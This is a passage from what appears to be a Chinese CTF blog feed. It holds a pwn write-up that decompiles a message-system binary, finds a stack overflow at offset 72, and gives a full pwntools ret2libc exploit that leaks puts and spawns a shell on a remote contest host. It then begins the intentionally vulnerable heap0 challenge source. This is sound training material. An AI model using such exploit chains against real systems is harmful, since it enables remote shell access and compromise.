  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-20h]</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>

  v5 <span class="token operator">=</span> a2<span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">sub_4009D6</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token string">"Welcome to easy message system."</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to easy message system."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v7 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">sub_400A7F</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your choose: "</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v3 <span class="token operator">=</span> <span class="token string">"%d"</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token function">sub_400B70</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
        v3 <span class="token operator">=</span> <span class="token string">"Exit"</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v7 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token function">sub_400AC2</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token punctuation">:</span>
        v3 <span class="token operator">=</span> <span class="token string">"invalid choose"</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invalid choose"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> dest <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">free</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>
    dest <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里的高难度做法等回去继续学习0.0今晚用基本的来解题</p>
<p>找到存在漏洞函数 case 1:   sub_400AC2();</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>int sub_400AC2()
{
  int result; // eax
  char *v1; // rax
  char src; // [rsp+0h] [rbp-40h]

  memset(dest, 0, 0x100uLL);
  puts(&quot;Input your message:&quot;);
  if ( (unsigned int)sub_400BE1(&amp;src, 256LL) == -1 )
  {
    memset(dest, 0, 0x100uLL);
    v1 = dest;
    *(_QWORD *)dest = 7008762548701852247LL;
    *((_WORD *)v1 + 4) = 24948;
    result = puts(&quot;Error: read message failde.&quot;);
  }
  else
  {
    strncpy(dest, &amp;src, 0xFFuLL);
    result = puts(&quot;save message success.&quot;);
  }
  return result;
}
</code></pre><p>我们先看下sub_400BE1()</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 __fastcall <span class="token function">sub_400BE1</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+17h] [rbp-9h]</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    v4 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v4 <span class="token operator">||</span> i <span class="token operator">==</span> a2 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">||</span> buf <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> i<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> i<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>使用了read函数将buf逐个字节读入栈中</p>
<p>然后return回sub_400AC2()</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">strncpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">,</span> <span class="token number">0xFFuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>看到如果读入输入成功就执行strncpy()函数将栈中刚输入的字符串复制到堆中 由于char src大小固定所以这里会造成栈溢出</p>
<p>那我们可以来算一下偏移</p>
<p>在strncpy()函数处下断</p>
<p><img src="/2018/07/23/西电线下赛PWN-writeup/2.jpg" alt="2"></p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ <span class="token function">file</span> relro
Reading symbols from relro<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
gdb-peda$ b* 0x400B1B
Breakpoint 1 at 0x400b1b
gdb-peda$ r
Starting program: /home/ios/relro 
Welcome to easy message system.
--------------------
1. save message
2. show message
3. <span class="token keyword">exit</span>
--------------------
Your choose: 1
Input your message:
AAAA
</code></pre>
<p>得到当前寄存器的值</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>
RAX: 0x603010 --<span class="token operator">></span> 0x0 
RBX: 0x0 
RCX: 0x7fffffffde30 --<span class="token operator">></span> 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
RDX: 0xff 
RSI: 0x7fffffffde30 --<span class="token operator">></span> 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
RDI: 0x603010 --<span class="token operator">></span> 0x0 
RBP: 0x7fffffffde70 --<span class="token operator">></span> 0x7fffffffdea0 --<span class="token operator">></span> 0x400c70 <span class="token punctuation">(</span>push   r15<span class="token punctuation">)</span>
RSP: 0x7fffffffde30 --<span class="token operator">></span> 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
RIP: 0x400b1b <span class="token punctuation">(</span>call   0x400770 <span class="token operator">&lt;</span>strncpy@plt<span class="token operator">></span><span class="token punctuation">)</span>
R8 <span class="token keyword">:</span> 0x7ffff7fda700 <span class="token punctuation">(</span>0x00007ffff7fda700<span class="token punctuation">)</span>
R9 <span class="token keyword">:</span> 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x400810 <span class="token punctuation">(</span>xor    ebp,ebp<span class="token punctuation">)</span>
R13: 0x7fffffffdf80 --<span class="token operator">></span> 0x1 
R14: 0x0 
R15: 0x0
</code></pre>
<p>然后计算当前src地址</p>
<p>ida可以看到</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> src<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-40h]</span>
</code></pre>
<p>所以当前rsp就是src地址</p>
<p>那我们计算当前src距rbp的偏移</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">Breakpoint 1, 0x0000000000400b1b <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
gdb-peda$ p/d 0x7fffffffde70-0x7fffffffde30
<span class="token variable">$1</span> <span class="token operator">=</span> 64
</code></pre>
<p>因为rbp距离ret的偏移为0x8</p>
<p>所以我们可以得到偏移为72</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ p/d 0x7fffffffde70-0x7fffffffde30 +0x8
<span class="token variable">$2</span> <span class="token operator">=</span> 72
</code></pre>
<h4 id="leak-memory"><a href="#leak-memory" class="headerlink" title="leak memory"></a>leak memory</h4><p> 关于leak memory 我在博客其他文章都有写到可以去参考</p>
<p>既然可以可以溢出覆盖到ret 那我们基本rop leak即可</p>
<p>同样注意 64位下 参数 从第一个到第六个依次保存在rdi，rsi，rdx，rcx，r8，r9。从第7个参数开始，接下来的所有参数都将通过栈传递</p>
<p>利用ROPgadget搜索可用gadget</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ ROPgadget --binary relro --only <span class="token string">"pop|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x0000000000400ccc <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400cce <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400cd0 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400cd2 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400ccb <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400ccf <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004008d9 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret
0x0000000000400cd3 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret
0x0000000000400cd1 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400ccd <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400746 <span class="token keyword">:</span> ret
0x000000000040028e <span class="token keyword">:</span> ret 0x8f7b
0x0000000000400c56 <span class="token keyword">:</span> ret 0xb60f

Unique gadgets found: 13
</code></pre>
<p>那我们这里用rdi</p>
<h4 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'relro'</span><span class="token punctuation">)</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
start_main <span class="token operator">=</span> <span class="token number">0x400810</span>
rdi <span class="token operator">=</span> <span class="token number">0x400cd3</span> <span class="token comment" spellcheck="true">#pop rdi ; ret</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_main<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"save message success.\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
data <span class="token operator">=</span>  p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
</code></pre>
<p>payload = 先覆盖到ret +覆盖ret位pop_rdi_ret（给puts()赋值 ） +准备泄露的puts_addr+puts_plt(调用puts()函数 )+返回程序开头 start_main</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因为我们重新返回到程序头所以会重新执行到main  既然我们leak出了puts函数地址所以我们可以根据提供的libc计算system_addr以及/bin/sh_addr 接着再次rop将/bin/sh参数放入rdi寄存器 然后执行system()调用 </p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>binsh
payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
</code></pre>
<h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 

<span class="token comment" spellcheck="true">#p = process('./relro')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'118.25.227.117'</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'relro'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choose: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your message:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
start_main <span class="token operator">=</span> <span class="token number">0x400810</span>
fake <span class="token operator">=</span><span class="token number">0x400A2C</span>
rdi <span class="token operator">=</span> <span class="token number">0x400cd3</span> <span class="token comment" spellcheck="true">#pop rdi ; ret</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_main<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"save message success.\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
data <span class="token operator">=</span>  p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choose: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your message:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
binsh <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>binsh
payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行</p>
<p><img src="/2018/07/23/西电线下赛PWN-writeup/3.jpg" alt="3"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;比赛结束了…垃圾的我拿了第六 菜归菜 但是也要继续学习orz&lt;/p&gt;
&lt;p&gt;感谢每一位西电的学长&lt;/p&gt;
&lt;h2 id=&quot;PWN1-EZ&quot;&gt;&lt;a href=&quot;#PWN1-EZ&quot; class=&quot;headerlink&quot; title=&quot;PWN1  EZ&quot;&gt;&lt;/a&gt;PWN1  EZ
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>heap-学习</title>
    <link href="http://iosmosis.github.io/2018/07/18/heap-%E5%AD%A6%E4%B9%A0/"/>
    <id>http://iosmosis.github.io/2018/07/18/heap-学习/</id>
    <published>2018-07-18T09:12:30.000Z</published>
    <updated>2019-09-12T04:47:59.392Z</updated>
    
    <content type="html"><![CDATA[<h2 id="heap0"><a href="#heap0" class="headerlink" title="heap0"></a>heap0</h2><p>源代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token keyword">struct</span> data <span class="token punctuation">{</span>
  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> fp <span class="token punctuation">{</span>
  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">nowinner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"level has not been passed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">struct</span> data <span class="token operator">*</span>d<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> fp <span class="token operator">*</span>f<span class="token punctuation">;</span>
  d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  f <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  f<span class="token operator">-></span>fp <span class="token operator">=</span> nowinner<span class="token punctuation">;</span>
